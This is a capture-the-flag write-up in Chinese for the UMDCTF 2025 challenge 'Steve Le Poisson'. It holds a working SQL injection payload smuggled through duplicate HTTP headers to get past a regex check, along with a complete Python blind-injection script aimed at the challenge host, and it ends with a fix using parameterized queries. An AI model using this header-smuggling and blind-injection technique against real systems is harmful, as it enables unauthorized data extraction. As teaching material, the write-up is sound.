# UMDCTF 2025 - Steve Le Poisson

## 题目简述

`GET /deviner` 把 `X-Steve-Supposition` 直接拼入 SQLite：

```javascript
const rows = await db.all(
  `SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'`
);
```

中间件声称只允许 `[a-zA-Z0-9{}]+`，但它在 `req.rawHeaders` 中逐项寻找同名头，
最终只验证最后一个值；路由使用的 `req.get` 却来自 Node 规范化后的 headers。
Node 22 会用 `, ` 合并重复的普通自定义头，于是可以让第一项承载 SQL 注入、最后一项
通过正则，并对 flag 做布尔盲注。

## 解题过程

发送两个同名头，恶意值在前，安全值在后：

```http
GET /deviner HTTP/1.1
Host: steve-le-poisson-api.challs.umdctf.io
X-Steve-Supposition: ' OR 1=1--
X-Steve-Supposition: safe
Connection: close
```

中间件的循环先看到恶意值，随后又把 `steveHeaderValue` 覆盖成 `safe`，所以最终正则
通过。路由取得的值则是：

```text
' OR 1=1--, safe
```

实际 SQL 变为：

```sql
SELECT * FROM flag
WHERE value = '' OR 1=1--, safe'
```

`--` 注释掉合并后的安全值和模板末尾引号，响应为 `Tu as raison!`。接口不回显查询
结果，所以还需把恒真条件换成逐字符条件：

```sql
unicode(substr(value, POS, 1)) > MID
```

每个注入头都短于中间件的 80 字节限制。可用原始 TLS socket 强制保留 HTTP/1.1
重复头，并对可打印 ASCII 做二分：

```python
import socket
import ssl

HOST = "steve-le-poisson-api.challs.umdctf.io"

def oracle(expr):
    injection = f"' OR ({expr})--"
    request = (
        "GET /deviner HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"X-Steve-Supposition: {injection}\r\n"
        "X-Steve-Supposition: safe\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

    ctx = ssl.create_default_context()
    with socket.create_connection((HOST, 443)) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as tls:
            tls.sendall(request)
            response = b""
            while chunk := tls.recv(4096):
                response += chunk
    return b"Tu as raison!" in response

flag = ""
for pos in range(1, 100):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr(value,{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    if flag.endswith("}"):
        break

print(flag)
```

数据库中的唯一 `flag.value` 被恢复为：

```text
UMDCTF{ile5TVR4IM3NtTresbEAu}
```

## 方法总结

本题的关键是同一请求存在三种表示：`rawHeaders` 保留重复项，中间件只记最后一项，
而路由读取 Node 合并后的字符串。安全校验与实际消费对象不一致，就产生了解析差异。
修复时应在统一规范化后拒绝重复安全关键头，并使用参数化查询：

```javascript
db.all("SELECT * FROM flag WHERE value = ?", [value]);
```

即使头校验完全正确，也不能把字符串验证当作 SQL 参数绑定的替代品。
